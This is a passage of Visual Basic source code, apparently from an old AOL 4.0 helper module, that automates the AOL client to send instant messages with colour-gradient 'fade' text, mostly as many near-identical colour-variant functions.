        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function
Sub InstantMessage(Recipiant, Message)
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindIt(AOL%, "MDIClient")
Call AOL4_Keyword("im")
Do: DoEvents
IMWin% = FindItsTitle(MDI%, "Send Instant Message")
AOEdit% = FindIt(IMWin%, "_AOL_Edit")
AORich% = FindIt(IMWin%, "RICHCNTL")
AOIcon% = FindIt(IMWin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SenditByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SenditByString(AORich%, WM_SETTEXT, 0, Message)
For X = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next X
Call Timeout(0.01)
Click (AOIcon%)
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindIt(AOL%, "MDIClient")
IMWin% = FindItsTitle(MDI%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop
End Sub
Sub Click(Button%)
SendNow% = SenditbyNum(Button%, WM_LBUTTONDOWN, &HD, 0)
SendNow% = SenditbyNum(Button%, WM_LBUTTONUP, &HD, 0)
End Sub
Function FindItsTitle(parentw, childhand)
Num1% = GetWindow(parentw, 5)
If UCase(GetCaption(Num1%)) Like UCase(childhand) Then GoTo god
Num1% = GetWindow(parentw, GW_CHILD)

While Num1%
Num2% = GetWindow(parentw, 5)
If UCase(GetCaption(Num2%)) Like UCase(childhand) & "*" Then GoTo god
Num1% = GetWindow(Num1%, 2)
If UCase(GetCaption(Num1%)) Like UCase(childhand) & "*" Then GoTo god
Wend
FindItsTitle = 0

god:
Qo0% = Num1%
FindItsTitle = Qo0%
End Function

Sub AOL4_Keyword(txt)
'This doesn't bring up the keyword window it does it in
'The toolbar textbox ;)
    AOL% = FindWindow("AOL Frame25", vbNullString)
    Temp% = FindIt(AOL%, "AOL Toolbar")
    Temp% = FindIt(Temp%, "_AOL_Toolbar")
    Temp% = FindIt(Temp%, "_AOL_Combobox")
    KWBox% = FindIt(Temp%, "Edit")
    Call SenditByString(KWBox%, WM_SETTEXT, 0, txt)
    Call SenditbyNum(KWBox%, WM_CHAR, VK_SPACE, 0)
    Call SenditbyNum(KWBox%, WM_CHAR, VK_RETURN, 0)
End Sub


Function FindIt(parentw, childhand)
Num1% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(Num1%), 1, Len(childhand))) Like UCase(childhand) Then GoTo god
Num1% = GetWindow(parentw, GW_CHILD)
If UCase(Mid(GetClass(Num1%), 1, Len(childhand))) Like UCase(childhand) Then GoTo god

While Num1%
Num2% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(Num2%), 1, Len(childhand))) Like UCase(childhand) Then GoTo god
Num1% = GetWindow(Num1%, 2)
If UCase(Mid(GetClass(Num1%), 1, Len(childhand))) Like UCase(childhand) Then GoTo god
Wend
FindIt = 0

god:
meeh% = Num1%
FindIt = meeh%
End Function
Function AoL4_ImBlackBlueBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function



Function AoL4_ImBlackGreen(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
      InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBlackGreenBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
      InstantMessage (who), ("" + Msg + "")
End Function
Function AoL4_ImBlackGrey(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 220 / A
        f = E * B
        G = RGB(f, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBlackGreyBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
      InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBlackPurple(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(f, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
      InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBlackPurpleBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBlackRed(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBlackRedBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBlackYellow(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBlackYellowBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBlueBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBlueBlackBlue(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBlueGreen(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBlueGreenBlue(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
      InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBluePurple(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBluePurpleBlue(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBlueRed(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBlueRedBlue(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBlueYellow(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
      InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBlueYellowBlue(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImBoldBlackBlue(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(f, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
      InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBlackBlueBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
      InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBlackedRedBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
       InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBlackGreen(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBlackGreenBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
       InstantMessage (who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldBlackGrey(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 220 / A
        f = E * B
        G = RGB(f, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    InstantMessage (who), ("<b>" + Msg + "")
End Function


Function AoL4_ImBoldBlackGreyBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
       InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBlackPurple(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(f, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
       InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBlackPurpleBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBlackRed(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBlackRedBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
      InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBlackYellow(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
      InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldBlackYellowBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    InstantMessage (who), ("<b>" + Msg + "")
End Function


Function AoL4_ImBoldBlueBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("<b>" + Msg + "")
End Function


Function AoL4_ImBoldBlueBlackBlue(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    InstantMessage (who), ("<b>" + Msg + "")
End Function


Function AoL4_ImBoldBlueGreen(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("<b>" + Msg + "")
End Function


Function AoL4_ImBoldBlueGreenBlue(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
       InstantMessage (who), ("<b>" + Msg + "")
End Function


Function AoL4_ImBoldBluePurple(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
      InstantMessage (who), ("<b>" + Msg + "")
End Function


Function AoL4_ImBoldBluePurpleBlue(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("<b>" + Msg + "")
End Function


Function AoL4_ImBoldBlueRed(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    InstantMessage (who), ("<b>" + Msg + "")
End Function


Function AoL4_ImBoldBlueRedBlue(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
      InstantMessage (who), ("<b>" + Msg + "")
End Function


Function AoL4_ImBoldBlueYellow(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
       InstantMessage (who), ("<b>" + Msg + "")
End Function


Function AoL4_ImBoldBlueYellowBlue(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreenBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, 255 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreenBlackGreen(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreenBlue(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(f, 255 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreenBlueGreen(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    InstantMessage (who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreenPurple(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(f, 255 - f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreenPurpleGreen(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    InstantMessage (who), ("<b>" + Msg + "")
End Function
Function AoL4_ImBoldGreenRed(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, 255 - f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreenRedGreen(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreenYellow(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, 255, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreenYellowGreen(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreyBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 220 / A
        f = E * B
        G = RGB(255 - f, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreyBlackGrey(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreyBlue(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreyBlueGrey(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreyGreen(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreyGreenGrey(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreyPurple(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreyPurpleGrey(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreyRed(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreyRedGrey(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    InstantMessage (who), ("<b>" + Msg + "")
End Function

Function AoL4_ImBoldGreyYellow(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, 255, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    InstantMessage (who), ("<b>" + Msg + "")
End Function
Function AoL4_ImGreenBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, 255 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImGreenBlackGreen(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function
Function AoL4_ImGreenBlue(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(f, 255 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImGreenBlueGreen(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function
Function AoL4_ImGreenPurple(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(f, 255 - f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImGreenPurpleGreen(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImGreenRed(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, 255 - f, f)
        H = RGBtoHEX(G)
